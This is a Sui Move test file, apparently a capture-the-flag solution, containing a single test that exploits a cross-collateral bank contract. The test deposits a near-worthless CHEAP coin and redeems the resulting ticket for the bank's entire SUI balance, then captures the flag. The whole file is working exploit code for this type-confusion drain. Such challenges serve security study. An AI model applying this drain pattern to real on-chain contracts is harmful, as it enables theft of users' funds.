#[test_only]
module cross_collateral::bank_tests;

use cross_collateral::bank;
use cross_collateral::cheap::CHEAP;
use sui::coin;
use sui::sui::SUI;
use sui::test_scenario as ts;
use sui::test_utils;

#[test]
fun cross_type_drain() {
    let attacker = @0xA;
    let mut sc = ts::begin(attacker);

    let mut bank = bank::create(ts::ctx(&mut sc));
    bank::list<SUI>(&mut bank, 1000, coin::mint_for_testing<SUI>(1_000_000, ts::ctx(&mut sc)));
    bank::list<CHEAP>(&mut bank, 1, coin::mint_for_testing<CHEAP>(1, ts::ctx(&mut sc)));

    let ticket = bank::deposit<CHEAP>(
        &mut bank,
        coin::mint_for_testing<CHEAP>(1000, ts::ctx(&mut sc)),
        ts::ctx(&mut sc),
    );
    let loot = bank::withdraw<SUI>(&mut bank, ticket, ts::ctx(&mut sc));

    assert!(coin::value(&loot) == 1_000_000, 0);
    assert!(bank::balance_of<SUI>(&bank) == 0, 1);
    bank::flag<SUI>(&bank);

    coin::burn_for_testing(loot);
    test_utils::destroy(bank);
    ts::end(sc);
}
